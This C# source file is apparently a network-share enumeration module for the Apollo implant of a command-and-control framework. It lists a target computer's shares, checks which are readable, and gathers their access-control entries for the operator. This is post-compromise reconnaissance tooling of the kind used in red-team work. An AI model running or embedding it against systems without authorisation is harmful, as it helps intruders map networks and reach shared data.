#define COMMAND_NAME_UPPER

#if DEBUG
#undef NET_SHARES
#define NET_SHARES
#endif


#if NET_SHARES
using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Mythic.Structs;
using Apollo.Jobs;
using Apollo.MessageInbox;
using Apollo.Tasks;
using Utils;
using static Native.Methods;
using static Native.Enums;
using static Native.Structures;
using static Native.Constants;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;


namespace Apollo.CommandModules
{
    class NetShares
    {
        public struct NetShareInformation
        {
            public string ComputerName;
            public string ShareName;
            public string Comment;
            public string Type;
            public bool Readable;
        }

        private static Dictionary<string, string> GetAceInformation(FileSystemAccessRule ace)
        {
            StringBuilder info = new StringBuilder();
            Dictionary<string, string> results = new Dictionary<string, string>();
            results["account"] = ace.IdentityReference.Value;
            results["type"] = ace.AccessControlType.ToString();
            results["rights"] = ace.FileSystemRights.ToString();
            results["is_inherited"] = ace.IsInherited.ToString();
            return results;
        }

        private static Dictionary<string, string>[] GetPermissions(DirectoryInfo di)
        {
            List<Dictionary<string, string>> permissions = new List<Dictionary<string, string>>();
            try
            {
                DirectorySecurity DirSec = di.GetAccessControl(AccessControlSections.Access);
                foreach (FileSystemAccessRule FSAR in DirSec.GetAccessRules(true, true, typeof(System.Security.Principal.NTAccount)))
                {
                    var tmp = GetAceInformation(FSAR);
                    if (tmp.Keys.Count == 0)
                        continue;
                    permissions.Add(tmp);
                }
            }
            catch { }

            return permissions.ToArray();
        }

        public static void Execute(Job job, Agent implant)
        {
            Task task = job.Task;
            string computer = task.parameters.Trim();
            if (string.IsNullOrEmpty(computer))
            {
                job.SetError("No computer given to list.");
                return;
            }

            try
            {
                NetShareInformation[] results = GetComputerShares(computer);
                if (results.Length > 0)
                {
                    foreach (NetShareInformation share in results)
                    {
                        DirectoryInfo pathDir;
                        try
                        {
                            pathDir = new DirectoryInfo($"\\\\{share.ComputerName}\\{share.ShareName}"); 
                        } catch (Exception ex)
                        {
                            continue;
                        }

                        FileBrowserResponse resp;
                        if (share.Readable)
                        {
                            resp = new FileBrowserResponse()
                            {
                                host = share.ComputerName,
                                is_file = false,
                                permissions = GetPermissions(pathDir),
                                name = pathDir.Name,
                                parent_path = pathDir.Parent != null ? pathDir.Parent.FullName : "",
                                success = true,
                                access_time = pathDir.LastAccessTimeUtc.ToString(),
                                modify_time = pathDir.LastWriteTimeUtc.ToString(),
                                size = 0,
                                files = new FileInformation[0]
                            };
                        } else
                        {
                            resp = new FileBrowserResponse()
                            {
                                host = share.ComputerName,
                                is_file = false,
                                permissions = GetPermissions(pathDir),
                                name = pathDir.Name,
                                parent_path = pathDir.Parent != null ? pathDir.Parent.FullName : "",
                                success = true,
                                access_time = "",
                                modify_time = "",
                                size = 0,
                                files = new FileInformation[0]
                            };
                        }
                        job.AddOutput(resp);
                    }
                }
                job.SetComplete(results);

            } catch (Exception ex)
            {
                job.SetError($"Failed to list shares. Reason: {ex.Message}");
            }
        }


        public static SHARE_INFO_1[] EnumNetShares(string Server)
        {
            List<SHARE_INFO_1> ShareInfos = new List<SHARE_INFO_1>();
            int entriesread = 0;
            int totalentries = 0;
            int resume_handle = 0;
            int nStructSize = Marshal.SizeOf(typeof(SHARE_INFO_1));
            IntPtr bufPtr = IntPtr.Zero;
            StringBuilder server = new StringBuilder(Server);
            int ret = NetShareEnum(server, 1, ref bufPtr, MAX_PREFERRED_LENGTH, ref entriesread, ref totalentries, ref resume_handle);
            if (ret == 0)
            {
                IntPtr currentPtr = bufPtr;
                for (int i = 0; i < entriesread; i++)
                {
                    SHARE_INFO_1 shi1 = (SHARE_INFO_1)Marshal.PtrToStructure(currentPtr, typeof(SHARE_INFO_1));
                    ShareInfos.Add(shi1);
                    currentPtr = (IntPtr)(currentPtr.ToInt64() + nStructSize);
                }
                NetApiBufferFree(bufPtr);
                return ShareInfos.ToArray();
            }
            else
            {
                ShareInfos.Add(new SHARE_INFO_1("ERROR=" + ret.ToString(), SHARE_TYPE.STYPE_UNKNOWN, string.Empty));
                return ShareInfos.ToArray();
            }
        }


        public static NetShareInformation[] GetComputerShares(string computer)
        {
            string[] errors = { "ERROR=53", "ERROR=5" };
            List<NetShareInformation> results = new List<NetShareInformation>();
            SHARE_INFO_1[] computerShares = EnumNetShares(computer);
            
            if (computerShares.Length > 0)
            {
                foreach (SHARE_INFO_1 share in computerShares)
                {
                    var result = new NetShareInformation();
                    result.ComputerName = computer;
                    result.ShareName = share.shi1_netname;
                    result.Comment = share.shi1_remark;
                    try
                    {
                        string path = String.Format("\\\\{0}\\{1}", computer, share.shi1_netname);
                        var files = System.IO.Directory.GetFiles(path);
                        result.Readable = true; 
                    }
                    catch
                    {
                        result.Readable = false;
                    }
                    switch (share.shi1_type)
                    {
                        case SHARE_TYPE.STYPE_DISKTREE:
                            result.Type = "Disk Drive";
                            break;
                        case SHARE_TYPE.STYPE_PRINTQ:
                            result.Type = "Print Queue";
                            break;
                        case SHARE_TYPE.STYPE_DEVICE:
                            result.Type = "Communication Device";
                            break;
                        case SHARE_TYPE.STYPE_IPC:
                            result.Type = "Interprocess Communication (IPC)";
                            break;
                        case SHARE_TYPE.STYPE_SPECIAL:
                            result.Type = "Special Reserved for IPC.";
                            //result.Type = "Special share reserved for interprocess communication (IPC$) or remote administration of the server (ADMIN$). Can also refer to administrative shares such as C$, D$, E$, and so forth.";
                            break;
                        case SHARE_TYPE.STYPE_CLUSTER_FS:
                            result.Type = "Cluster Share";
                            break;
                        case SHARE_TYPE.STYPE_CLUSTER_SOFS:
                            result.Type = "Scale Out Cluster Share";
                            break;
                        case SHARE_TYPE.STYPE_CLUSTER_DFS:
                            result.Type = "DFS Share in Cluster";
                            break;
                        case SHARE_TYPE.STYPE_TEMPORARY:
                            result.Type = "Temporary Share";
                            break;
                        default:
                            result.Type = $"Unknown type ({share.shi1_type})";
                            break;

                    }
                    results.Add(result);
                }
            }
            return results.ToArray();
        }



    }
}
#endif